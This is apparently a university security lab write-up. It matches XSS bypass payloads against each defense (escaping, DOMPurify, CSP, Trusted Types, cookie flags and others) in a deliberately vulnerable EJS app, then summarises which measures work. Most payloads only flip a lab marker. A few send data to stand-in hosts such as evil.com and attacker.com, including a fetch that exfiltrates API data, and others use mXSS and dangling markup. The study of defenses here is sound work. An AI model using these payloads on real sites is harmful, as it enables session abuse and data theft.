# EC521 Lab — Bypass Payloads That Each Defense Cannot Block

> Based on D:\EC521-Project source code + PortSwigger XSS Cheat Sheet
> Success criterion: payload causes `document.body.dataset.xssState` to change to a non-idle value, or modifies the `#lab-success-marker` text

---

## Project Implementation Overview

| Route | Sink Type | Server-Side Processing | Client-Side Processing |
|-------|-----------|----------------------|----------------------|
| /reflect | EJS template output `<%- source %>` (raw) or `<%= source %>` (escaped) | `processInput()` = allowlist + DOMPurify | None |
| /stored | Same as /reflect, iterates over comments | Same as above; raw storage, processInput at render time | None |
| /dom | Client-side `innerHTML` | No server-side processing | dom.js: innerHTML / textContent / DOMPurify / Trusted Types |
| /gadget | Dynamic `<script src=loader>` | No processing | gadget.js: reads `?loader=` param, creates script element |

---

## 1. HTML Escape (`enableEscape`)

**Implementation:** `escapeHtml()` escapes `& < > " '`; EJS uses `<%= %>` for output

### Payloads It Cannot Block:

**Against /dom (completely ineffective — client-side innerHTML sink):**
```
<img src=x onerror="document.body.dataset.xssState='success'">
<xss onfocus=document.body.dataset.xssState='success' autofocus tabindex=1>
<details ontoggle=document.body.dataset.xssState='success' open>x</details>
<style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart="document.body.dataset.xssState='success'">
```

**Against /gadget (completely ineffective — script.src loading):**
```
/static/payload.js
(any same-origin JS file path)
```

**Against /reflect and /stored — JS context sink (when enableContextEncoding is OFF):**
```
The template now embeds user input inside a <script> block: var userInput = "<%- jsOut %>";
When only HTML Escape is enabled (no Context Encoding), jsOut is the raw input.
<%- %> outputs it unescaped into the JS string. The attacker can close the script block:

Payload: </script><img src=x onerror="document.body.dataset.xssState='success'">

The browser's HTML parser sees </script> first and closes the script block,
then parses the remaining <img> tag as HTML — triggering the onerror handler.
HTML Escape on the HTML body output does not protect this JS context sink.
```

---

## 2. Allowlist Validation (`enableAllowlist`)

**Implementation:** `allowlistText()` only strips control characters `\x00-\x08, \x0B, \x0C, \x0E-\x1F, \x7F`

### Payloads It Cannot Block (nearly all — only strips control characters):

**Against /reflect:**
```
<img src=x onerror="document.body.dataset.xssState='success'">
<svg onload="document.body.dataset.xssState='success'">
<body onload="document.body.dataset.xssState='success'">
```

**Against /stored:**
```
<img src=x onerror="document.body.dataset.xssState='success'">
```

**Against /dom:**
```
<img src=x onerror="document.body.dataset.xssState='success'">
```

**Against /gadget:**
```
/static/payload.js
```

> Note: The current allowlistText is not a true HTML tag allowlist — it only removes invisible control characters. It provides virtually no XSS protection.

---

## 3. Context Encoding (`enableContextEncoding`)

**Implementation:** HTML → `escapeHtml()`, Attribute → `escapeAttr()` (additionally escapes backticks), JS → `escapeJsString()`, URL → `sanitizeUrl()` (blocks `javascript:` and `data:` protocols)

### Payloads It Cannot Block:

**Against /dom (client-side is unaffected by server-side encoding):**
```
<img src=x onerror="document.body.dataset.xssState='success'">
<xss onfocus=document.body.dataset.xssState='success' autofocus tabindex=1>
```

**Against /gadget (URL encoding does not apply to script.src):**
```
/static/payload.js
```

**Against /reflect in JS context (limitations of escapeJsString):**
```
(escapeJsString does not escape < and >, so if a JS string is embedded in HTML,
 it is still possible to inject </script> to escape the context)
Example: </script><img src=x onerror="document.body.dataset.xssState='success'">
```

---

## 4. Template Auto-Escape (`enableTemplateAutoEscape`)

**Implementation:** EJS `<%= %>` automatically escapes HTML entities (equivalent to HTML Escape)

### Payloads It Cannot Block:

**Against /dom (template does not participate in client-side rendering):**
```
<img src=x onerror="document.body.dataset.xssState='success'">
<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="document.body.dataset.xssState='success'">
<xss oncontentvisibilityautostatechange=document.body.dataset.xssState='success' style=display:block;content-visibility:auto>
```

**Against /gadget (template does not participate in script.src):**
```
/static/payload.js
```

**Against /reflect and /stored (if using `<%- %>` unescaped):**
```
(When enableTemplateAutoEscape=false, reflect.ejs line 13 uses <%- source %> for raw output)
<img src=x onerror="document.body.dataset.xssState='success'">
<svg onload="document.body.dataset.xssState='success'">
```

---

## 5. DOM Sanitizer (`enableDomSanitizer` — DOMPurify)

**Implementation:**
- Server-side: `DOMPurify.sanitize()` runs in `processInput()`, configured with `FORBID_TAGS: ['style'], FORBID_ATTR: ['style']`
- Client-side /dom: `DOMPurify.sanitize()` in dom.js with the same configuration

### Payloads It Cannot Block:

**Against /gadget (DOMPurify is completely uninvolved in script.src loading logic):**
```
/static/payload.js
https://evil.com/xss.js (external script — effective when CSP is not enabled)
```

**Against /dom via mXSS vectors (exploiting browser parsing differences to bypass DOMPurify):**
```
<svg><svg><b><noscript>&lt;/noscript&gt;&lt;img src=x onerror=document.body.dataset.xssState='success'&gt;</noscript></b></svg>
(mXSS — depends on DOMPurify version; certain older versions can be bypassed)
```

**Against /reflect and /stored via Scriptless/Dangling Markup (no scripts or events — DOMPurify may allow):**
```
<img src="//attacker.com?leak=
<link rel=stylesheet href="//attacker.com?
(Data exfiltration — does not change xssState, but still a security concern)
```

---

## 6. CSP Basic (`enableCsp`, `cspMode='basic'`)

**Implementation:** `script-src 'self'; object-src 'none'; base-uri 'none'; frame-ancestors 'self'`

### Payloads It Cannot Block:

**Against /gadget (same-origin scripts are allowed to load — the core bypass point):**
```
/static/payload.js
(script-src 'self' permits all JS from any same-origin path)
```

**Against /dom (innerHTML-injected event handlers do not require script-src):**
```
Note: CSP basic does not include script-src-attr 'none', but inline event handlers
are blocked by 'self' (no unsafe-inline).
However: onerror in <img src=x onerror=...> is an inline event — it should be blocked
without 'unsafe-inline'. But older browser versions or CSP header parsing anomalies
may allow bypass.
```

**Against /reflect and /stored (same-origin script injection is still possible):**
```
<script src="/static/payload.js"></script>
(If HTML Escape is not enabled, a same-origin script tag can be injected)
```

**Scriptless attacks (CSP does not block non-script resource loading):**
```
<meta http-equiv="refresh" content="0; http://evil?
(However, base-uri 'none' already blocks base tag injection)
```

---

## 7. CSP strict-dynamic (`cspMode='strict-dynamic'`)

**Implementation:** `script-src 'nonce-xxx' 'strict-dynamic'; script-src-attr 'none'; object-src 'none'; base-uri 'none'`

### Payloads It Cannot Block:

**Against /gadget (gadget.js itself has a nonce — child scripts it dynamically creates inherit trust via strict-dynamic):**
```
/static/payload.js
(gadget.js is a nonce-bearing script; scripts it appends via appendChild inherit trust!
 This is by design in strict-dynamic: child scripts dynamically loaded by nonce scripts
 are automatically trusted. So the gadget route remains exploitable.)
```

**Against /dom (strict-dynamic + script-src-attr 'none' blocks inline event handlers):**
```
Inline event handlers are blocked by script-src-attr 'none'.
However, dom.js itself has a nonce, and its innerHTML operations can still execute
when Trusted Types is not enabled.
If DOMPurify is also not enabled, payloads injected via innerHTML have their event
handlers blocked by CSP, but the DOM structure modification itself may cause other issues.
```

**Scriptless data exfiltration (not restricted by script-src):**
```
<img src="//evil?leak=
<link rel=stylesheet href="//evil?
```

---

## 8. Cookie Flags (`cookieHttpOnly`, `cookieSecure`, `cookieSameSite`)

**Implementation:** `res.cookie("session", "demo-session-token", { httpOnly, secure, sameSite })`

### Payloads It Cannot Block (XSS still executes — only cookie access is limited):

**Against all routes — the following attacks do not require cookie access:**
```
<img src=x onerror="document.body.dataset.xssState='success'">
(DOM tampering — HttpOnly does not prevent this)

<img src=x onerror="document.getElementById('lab-success-marker').textContent='pwned'">
(Page content tampering — does not need cookies)

<img src=x onerror="fetch('/api/config').then(r=>r.text()).then(t=>fetch('//evil?data='+btoa(t)))">
(API data exfiltration — fetch with session cookie still works for same-origin API requests,
 because HttpOnly only prevents document.cookie reads, not the browser's automatic
 cookie inclusion in requests)
```

**Against /gadget:**
```
/static/payload.js
(Completely unaffected by Cookie Flags)
```

---

## 9. Origin Check (`enableOriginCheck`)

**Implementation:** Only checks Origin/Referer headers on POST/PUT/DELETE requests; GET/HEAD/OPTIONS pass through directly

### Payloads It Cannot Block:

**Against /reflect (GET request — passes through directly):**
```
/reflect?q=<img src=x onerror="document.body.dataset.xssState='success'">
(Origin Check has no effect on GET requests)
```

**Against /dom (GET request — client-side processing):**
```
/dom?q=<img src=x onerror="document.body.dataset.xssState='success'">
```

**Against /gadget (GET request):**
```
/gadget?loader=/static/payload.js
```

**Against /stored (POST submission is blocked, but previously stored malicious content renders unrestricted on GET):**
```
(If an attacker has already successfully submitted a malicious comment,
 subsequent GET /stored renders are not checked by Origin Check)
```

---

## 10. DOM API Restriction (`enableDomDefense`)

**Implementation:** dom.js uses `target.textContent = q` (replacing innerHTML with textContent)

### Payloads It Cannot Block:

**Against /reflect and /stored (server-side rendering — does not go through dom.js):**
```
<img src=x onerror="document.body.dataset.xssState='success'">
<svg onload="document.body.dataset.xssState='success'">
<details ontoggle=document.body.dataset.xssState='success' open>x</details>
```

**Against /gadget (script.src is outside the scope of DOM API restriction):**
```
/static/payload.js
```

**Against /dom (textContent effectively prevents HTML parsing, but cannot prevent misuse of other DOM APIs):**
```
(enableDomDefense is effective against /dom's innerHTML sink.
 However, if other JS code in the application uses eval(), document.write(),
 or location.href = 'javascript:...', DOM API Restriction does not cover these.)
```

---

## 11. Trusted Types (`enableTrustedTypes`)

**Implementation:** CSP header adds `require-trusted-types-for 'script'; trusted-types xss-lab-policy`; dom.js creates a policy using DOMPurify

### Payloads It Cannot Block:

**Against /reflect and /stored (server-side EJS rendering — does not go through DOM sinks):**
```
<img src=x onerror="document.body.dataset.xssState='success'">
<body onload="document.body.dataset.xssState='success'">
<style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart="document.body.dataset.xssState='success'">
```

**Against /gadget (gadget.js uses script.src, not innerHTML — Trusted Types primarily governs innerHTML/document.write):**
```
/static/payload.js
(script.src assignment is not restricted by require-trusted-types-for 'script';
 that directive primarily blocks raw string assignment to innerHTML, document.write,
 and similar DOM sinks. createElement('script').src = url is a legitimate DOM API call.)
```

---

## 12. Avoid innerHTML (`enableAvoidInnerHtml`)

**Implementation:** dom.js directly uses `target.textContent = q`, skipping innerHTML

### Payloads It Cannot Block:

**Against /reflect (server-side rendering):**
```
<img src=x onerror="document.body.dataset.xssState='success'">
<svg onload="document.body.dataset.xssState='success'">
```

**Against /stored (server-side rendering):**
```
<img src=x onerror="document.body.dataset.xssState='success'">
```

**Against /gadget (script.src is not innerHTML):**
```
/static/payload.js
```

---

## 13. Cross-Origin Isolation (COOP/COEP/CORP)

**Implementation:** `Cross-Origin-Opener-Policy: same-origin`, `Cross-Origin-Embedder-Policy: require-corp`, `Cross-Origin-Resource-Policy: same-origin`

### Payloads It Cannot Block (ineffective against all XSS — only defends against Spectre-class side-channel attacks):

**Against all routes:**
```
<img src=x onerror="document.body.dataset.xssState='success'">
/static/payload.js
(All XSS payloads still execute; Cross-Origin Isolation is not an XSS defense measure)
```

---

## 14. Security Headers (`enableSecurityHeaders`)

**Implementation:** `X-Content-Type-Options: nosniff`, `X-Frame-Options: SAMEORIGIN`, `Referrer-Policy: no-referrer`, `Permissions-Policy: geolocation=(), camera=(), microphone=()`

### Payloads It Cannot Block:

**Against all routes (does not prevent XSS execution):**
```
<img src=x onerror="document.body.dataset.xssState='success'">
/static/payload.js
(Security Headers are supplementary measures; they do not block XSS payload execution)
```

---

## Summary Matrix: Bypass Payloads per Defense × Route

### /reflect
| Defense | Bypassable? | Representative Bypass Payload |
|---------|:-----------:|------|
| HTML Escape | **Yes (JS context)** | `</script><img src=x onerror=...>` escapes the script block |
| Allowlist | Yes | `<img src=x onerror=...>` |
| Context Encoding | Partially | `</script>` escape in JS context |
| Template Auto-Escape | No (`<%= %>`) | But if fallback to `<%- %>` (raw), all bypasses work |
| DOMPurify | No | Tags/event attributes are stripped |
| CSP basic | Yes | `<script src="/static/payload.js">` |
| CSP strict-dynamic | No | Inline scripts and event handlers are blocked |
| Cookie Flags | Yes | DOM tampering payloads don't need cookies |
| Origin Check | Yes | GET requests are not checked |
| Trusted Types | Yes | Server-side rendering doesn't go through DOM sinks |
| Avoid innerHTML | Yes | Server-side rendering doesn't use innerHTML |
| Cross-Origin Isolation | Yes | Completely unrelated |
| Security Headers | Yes | Completely unrelated |

### /stored
| Defense | Bypassable? | Representative Bypass Payload |
|---------|:-----------:|------|
| HTML Escape | **Yes (JS context)** | Same as /reflect — `</script>` escape |
| Allowlist | Yes | `<img src=x onerror=...>` |
| Context Encoding | No (HTML context) | Effective escaping |
| Template Auto-Escape | No | But raw mode allows bypass |
| DOMPurify | No | Server-side sanitization |
| CSP basic | Yes | Same-origin script |
| CSP strict-dynamic | No | Blocked |
| Cookie Flags | Yes | Same as above |
| Origin Check | Partially | POST is blocked, but GET rendering is not checked |
| Trusted Types | Yes | Server-side rendering |
| Avoid innerHTML | Yes | Server-side rendering |
| Cross-Origin Isolation | Yes | Unrelated |
| Security Headers | Yes | Unrelated |

### /dom
| Defense | Bypassable? | Representative Bypass Payload |
|---------|:-----------:|------|
| HTML Escape | Yes | Client-side is unaffected by server-side escaping |
| Allowlist | Yes | Client-side is unaffected |
| Context Encoding | Partially | dom.js has client-side `encodeHtml()` |
| Template Auto-Escape | Yes | Client-side is unaffected |
| DOMPurify (client) | No | Effectively strips dangerous tags (except mXSS) |
| DOM API Restriction | No | Uses textContent instead of innerHTML |
| CSP basic | No | Inline event handlers are blocked |
| CSP strict-dynamic | No | More strictly blocked |
| Trusted Types | No | DOM sinks are governed |
| Avoid innerHTML | No | innerHTML is not used |
| Cookie Flags | Yes | Unrelated |
| Origin Check | Yes | GET is not checked |
| Cross-Origin Isolation | Yes | Unrelated |
| Security Headers | Yes | Unrelated |

### /gadget
| Defense | Bypassable? | Representative Bypass Payload |
|---------|:-----------:|------|
| HTML Escape | Yes | Does not involve HTML output |
| Allowlist | Yes | Not involved |
| Context Encoding | Yes | Not involved |
| Template Auto-Escape | Yes | Not involved |
| DOMPurify | Yes | Not involved |
| CSP basic (`'self'`) | Yes | `/static/payload.js` is same-origin |
| CSP strict-dynamic | **Yes** | gadget.js has nonce → dynamically loaded child scripts inherit trust |
| Cookie Flags | Yes | Does not involve cookies |
| Origin Check | Yes | GET is not checked |
| DOM API Restriction | Yes | Does not involve innerHTML |
| Trusted Types | Yes | script.src is not governed by Trusted Types |
| Avoid innerHTML | Yes | Does not involve innerHTML |
| Cross-Origin Isolation | Yes | Unrelated |
| Security Headers | Yes | Unrelated |

---

## Key Conclusions

1. **/gadget is the hardest route to defend** — nearly all defense measures fail to block it, because the vulnerability is an architectural design issue (trusting an attacker-controlled URL to load scripts). The only effective fix is: do not read script paths from URL parameters; use a fixed allowlist mapping instead.

2. **/dom requires client-side defenses** — server-side HTML Escape and Template Auto-Escape are completely ineffective against DOM XSS. Defense must rely on client-side DOMPurify + textContent + Trusted Types.

3. **Cookie Flags, Origin Check, Cross-Origin Isolation, and Security Headers** do not prevent XSS payload execution itself — they only limit the impact scope after a successful XSS attack.

4. **Allowlist Validation** in its current implementation (only stripping control characters) provides virtually no XSS protection.

*Source: PortSwigger XSS Cheat Sheet (2026-01-27) + EC521-Project source code analysis*
